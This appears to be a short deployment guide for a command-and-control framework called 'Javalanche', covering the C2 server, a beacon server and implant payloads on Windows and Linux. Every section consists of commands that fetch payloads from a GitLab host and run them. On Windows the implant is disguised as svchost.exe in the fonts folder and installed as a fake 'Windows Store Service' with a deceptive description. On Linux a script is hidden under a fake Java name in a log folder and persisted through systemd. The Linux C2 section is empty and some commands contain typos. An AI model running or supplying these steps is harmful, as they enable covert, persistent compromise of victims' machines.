To The following file contains documentation to manually deploy the agent, proxy server, or C2 server on both Windows and Linux.

Windows C2 Server

ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
ps> .\setup.ps1


Windows Long Range Beacon Server

ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
ps> .\setup.ps1 -server Beacon


Windows Payload

ps> wget -o C:\\Windows\fonts\svchost.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads 
ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\\Windows\\fonts\\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
ps> Start-Service -name 'Windows Store Service'


Linux C2 Server

Linux Payload

$ sudo apt update
$ sudo apt install curl
$ sudo mkdir /var/log/asa/osa
$ sudo curl -o /var/log/asa/osa/java-23.0.1-bin-java.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
$ sudo chmod +x /var/log/asa/osa/java-23.0.1-bin-java.sh
$ sudo curl -o /lib/systemd/system/java-23.0.1-bin-java.service "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads"
$ sudo chmod 644 /lib/systemd/system/java-23.0.1-bin-java.service
$ systemctl daemon-reload
$ suod systemctl enable java-23.0.1-bin-java.service
$ sudo systemctl start java-23.0.1-bin-java.service
